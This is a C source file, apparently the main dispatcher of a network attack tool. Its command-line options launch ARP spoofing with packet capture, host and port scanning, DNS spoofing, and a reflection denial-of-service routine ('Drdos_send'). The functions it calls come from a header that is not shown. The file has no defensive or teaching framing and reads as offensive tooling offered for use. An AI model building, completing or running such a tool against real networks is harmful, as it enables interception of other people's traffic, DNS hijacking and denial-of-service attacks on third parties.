#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include "kh_ca.h"


int main( int argc, char *argv[] )
{

  /* Check argument & setting option number */

  if( argc < 2 ) { 
    printf( "\n**** Please insert argument at least one thing ****"
            "\n**** Refer to options [--help]                 ****\n\n" ); 
    exit(1);

  } else { Option( argv[1] ); }



  /* Execute accroding to option number */

  int i;
  extern int option_num;


  if( option_num == 1 || option_num == 2 ) {   


    /* arp & ip packet sniff */

    printf( "Get target informations...." );

    ARP_get_my_info();

    for( i = 2; i < argc; i++ ) { ARP_get_target_mac_addr( i-2, argv[i] ); }

    printf( "Done\n" );


    printf( "Start Spoofing...." );

    pid_t pid = fork();

    if( pid == 0 ) { ARP_send_reply(); }

    else { 

      printf( "Done\n" );

      printf( "Start packet capture....\n" );

      PCAP_packet_capture();
    }

 

  } else if( option_num == 3 ) {


    /* Host Scanning */

    ARP_get_my_info();

    SCAN_get_network_if( argv[2], argv[3] );

    pid_t pid = fork();

    if( pid == 0 ) { SCAN_send_tcp_packet(); }

    else { 

      printf( "\nstart scanning!!\n\n" ); 

      PCAP_packet_capture();
    }



  } else if( option_num == 4 ) {


    /* Port Scanning */

    ARP_get_my_info();

    for( i = 2; i < argc; i++ ) { ARP_get_target_mac_addr( i-2, argv[i] ); }

    pid_t pid = fork();

    if( pid == 0 ) { SCAN_send_tcp_packet(); }

    else {

      printf( "\nstart scanning!!\n\n" );

      PCAP_packet_capture();
    }


  } else if( option_num == 5 ) {


    /* DNS Spoofing */

    printf( "Get target informations...." );

    ARP_get_my_info();

    for( i = 2; i < argc; i++ ) { ARP_get_target_mac_addr( i-2, argv[i] ); }

    printf( "Done\n" );


    printf( "Start Spoofing...." );

    pid_t pid = fork();

    if( pid == 0 ) { ARP_send_reply(); }

    else {

      printf( "Done\n" );

      printf( "Start packet capture....\n" );

      PCAP_packet_capture();
    }



  } else if( option_num == 6 ) {

    ARP_get_my_info();

    for( i = 2; i < argc; i++ ) { ARP_get_target_mac_addr( i-2, argv[i] ); }

    Drdos_send();

  }

  return 0;
}
